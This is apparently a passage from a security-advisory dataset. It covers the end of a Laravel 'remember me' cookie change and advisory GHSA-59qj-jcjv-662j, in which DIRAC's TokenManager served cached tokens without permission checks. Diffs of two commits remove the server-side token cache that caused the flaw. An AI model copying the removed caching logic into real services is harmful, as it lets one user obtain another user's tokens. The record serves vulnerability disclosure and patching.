+DESC: Laravel 4.1.26 introduces security improvements for "remember me" cookies. Before this update, if a remember cookie was hijacked by another malicious user, the cookie would remain valid for a long period of time, even after the true owner of the account reset their password, logged out, etc. This change requires the addition of a new remember_token column to your users (or equivalent) database table. After this change, a fresh token will be assigned to the user each time they login to your application. The token will also be refreshed when the user logs out of the application. The implications of this change are: if a "remember me" cookie is hijacked, simply logging out of the application will invalidate the cookie.
+
+=== GHSA-59qj-jcjv-662j sev=critical pkgs=['pip:DIRAC', 'pip:dirac']
+src=https://github.com/DIRACGrid/DIRAC cwes=['CWE-200']
+SUMMARY: DIRAC's TokenManager does not check permissions on cached tokens
+DESC: ### Impact Any user could get a token that has been requested by another user/agent ### Patches The vulnerability is fixed in version 8.0.37. ### Workarounds None ### References
+FIX commit https://github.com/DIRACGrid/DIRAC/commit/9487921684e2925b4cf72d6c423718cf4950f3fe status=200
+  MSG: Merge pull request from GHSA-59qj-jcjv-662j [integration] Remove server side cache in TokenManager
+  FILE src/DIRAC/FrameworkSystem/Service/TornadoTokenManagerHandler.py
+    -The service and its client have a mechanism for caching the received tokens.
+    +The client has a mechanism for caching the received tokens.
+    -It in turn checks the cache and if the ``access token`` is already invalid tries to update it using a ``refresh token``.
+    -If the required token is not in the cache, then the ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    -is taken and the **exchange token** request to Identity Provider is made. The received tokens are cached.
+    +The ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    +is taken and the **exchange token** request to Identity Provider is made.
+    -# Used to synchronize the cache with user tokens
+    -gTokensSync = ThreadSafe.Synchronizer()
+    -        # Cache containing tokens from scope requested by the client
+    -        cls.__tokensCache = DictCache()
+    -    @gTokensSync
+    -        # Search for an existing token in tokensCache
+    -        cachedKey = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -        result = getCachedToken(self.__tokensCache, cachedKey, requiredTimeLeft)
+    -        if result["OK"]:
+    -            # A valid token has been found and is returned
+    -            return result
+    +        # getCachedKey is just used here to resolve the default scopes
+    +        _, scope, *_ = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -            scope = cachedKey[1]
+    -            audience = cachedKey[2]
+    -            if not result["OK"]:
+    -                return result
+    -            token = result["Value"]
+    -            # Caching new token: only get an access token (no refresh token in this context)
+    -            self.__tokensCache.add(
+    -                cachedKey,
+    -                result["Value"].get_claim("exp", "access_token") or DEFAULT_AT_EXPIRATION_TIME,
+    -                token,
+FIX commit https://github.com/DIRACGrid/DIRAC/commit/f9ddab755b9a69acb85e14d2db851d8ac0c9648c status=200
+  MSG: Merge pull request from GHSA-59qj-jcjv-662j [8.0] Remove server side cache in TokenManager
+  FILE src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py
+    -The service and its client have a mechanism for caching the received tokens.
+    +The client has a mechanism for caching the received tokens.
+    -It in turn checks the cache and if the ``access token`` is already invalid tries to update it using a ``refresh token``.
+    -If the required token is not in the cache, then the ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    -is taken and the **exchange token** request to Identity Provider is made. The received tokens are cached.
+    +The ``refresh token`` from :py:class:`TokenDB <DIRAC.FrameworkSystem.DB.TokenDB.TokenDB>`
+    +is taken and the **exchange token** request to Identity Provider is made.
+    -    getCachedToken,
+    -# Used to synchronize the cache with user tokens
+    -gTokensSync = ThreadSafe.Synchronizer()
+    -        # Cache containing tokens from scope requested by the client
+    -        cls.__tokensCache = DictCache()
+    -    @gTokensSync
+    -        # Search for an existing token in tokensCache
+    -        cachedKey = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -        result = getCachedToken(self.__tokensCache, cachedKey, requiredTimeLeft)
+    -        if result["OK"]:
+    -            # A valid token has been found and is returned
+    -            return result
+    +        # getCachedKey is just used here to resolve the default scopes
+    +        _, scope, *_ = getCachedKey(idpObj, username, userGroup, scope, audience)
+    -            scope = cachedKey[1]
+    -            audience = cachedKey[2]
+    -            if not result["OK"]:
+    -                return result
+    -            token = result["Value"]
+    -            # Caching new token: only get an access token (no refresh token in this context)
+    -            self.__tokensCache.add(
+    -                cachedKey,
+    -                result["Value"].get_claim("exp", "access_token") or DEFAULT_AT_EXPIRATION_TIME,
